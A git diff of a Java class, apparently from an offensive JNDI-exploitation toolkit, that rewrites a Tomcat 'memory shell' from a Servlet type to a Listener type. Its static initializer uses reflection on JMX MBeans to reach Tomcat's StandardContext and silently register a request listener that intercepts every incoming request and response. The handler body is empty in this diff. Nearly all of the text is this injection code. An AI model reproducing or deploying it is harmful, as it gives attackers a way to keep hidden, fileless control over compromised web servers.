@@ -2,28 +2,28 @@ package com.qi4l.jndi.template.memshellStatic.tomcat;
 
 import com.sun.jmx.mbeanserver.NamedObject;
 import com.sun.jmx.mbeanserver.Repository;
-import org.apache.catalina.Wrapper;
-import org.apache.catalina.core.ApplicationServletRegistration;
+import org.apache.catalina.connector.Request;
+import org.apache.catalina.connector.RequestFacade;
+import org.apache.catalina.connector.Response;
 import org.apache.catalina.core.StandardContext;
 import org.apache.tomcat.util.modeler.Registry;
 
 import javax.management.DynamicMBean;
 import javax.management.MBeanServer;
 import javax.management.ObjectName;
-import javax.servlet.*;
+import javax.servlet.ServletRequestEvent;
+import javax.servlet.ServletRequestListener;
+import javax.servlet.http.HttpServletRequest;
+import javax.servlet.http.HttpServletResponse;
 import java.lang.reflect.Field;
 import java.util.Set;
 
 /**
- * 使用 JMX Bean 注入 Tomcat Servlet 型内存马
+ * 使用 JMX Bean 注入 Tomcat Listener 型内存马
  *
  * @author QI4L
  */
-public class TSMSFromJMXS implements Servlet {
-
-    public static String pattern;
-
-    public static String NAME;
+public class TLMSFromJMX implements ServletRequestListener {
 
     static {
         try {
@@ -41,6 +41,7 @@ public class TSMSFromJMXS implements Servlet {
                 // springboot的jmx中为Tomcat而非Catalina
                 objectSet = repository.query(new ObjectName("Tomcat:host=localhost,name=NonLoginAuthenticator,type=Valve,*"), null);
             }
+
             for (NamedObject namedObject : objectSet) {
                 DynamicMBean dynamicMBean = namedObject.getObject();
                 field = Class.forName("org.apache.tomcat.util.modeler.BaseModelMBean").getDeclaredField("resource");
@@ -51,41 +52,30 @@ public class TSMSFromJMXS implements Servlet {
                 field.setAccessible(true);
                 StandardContext standardContext = (StandardContext) field.get(obj);
 
-                if (standardContext.findChild(NAME) == null) {
-                    Wrapper wrapper = standardContext.createWrapper();
-                    wrapper.setName(NAME);
-                    standardContext.addChild(wrapper);
-                    Servlet servlet = new TSMSFromJMXS();
-                    wrapper.setServletClass(servlet.getClass().getName());
-                    wrapper.setServlet(servlet);
-                    ServletRegistration.Dynamic registration = new ApplicationServletRegistration(wrapper, standardContext);
-                    registration.addMapping(pattern);
-                }
+                TLMSFromJMX listener = new TLMSFromJMX();
+                standardContext.addApplicationEventListener(listener);
             }
         } catch (Exception ignored) {
         }
     }
 
     @Override
-    public void init(ServletConfig servletConfig) throws ServletException {
-
+    public void requestDestroyed(ServletRequestEvent servletRequestEvent) {
     }
 
     @Override
-    public ServletConfig getServletConfig() {
-        return null;
+    public void requestInitialized(ServletRequestEvent servletRequestEvent) {
+        try {
+            RequestFacade requestFacade = (RequestFacade) servletRequestEvent.getServletRequest();
+            Field         field         = requestFacade.getClass().getDeclaredField("request");
+            field.setAccessible(true);
+            Request  request  = (Request) field.get(requestFacade);
+            Response response = request.getResponse();
+            requestInitializedHandle(request, response);
+        } catch (Exception ignore) {
+        }
     }
 
-    @Override
-    public void service(ServletRequest servletRequest, ServletResponse servletResponse) {
-    }
-
-    @Override
-    public String getServletInfo() {
-        return null;
-    }
-
-    @Override
-    public void destroy() {
+    public void requestInitializedHandle(HttpServletRequest request, HttpServletResponse response) {
     }
 }
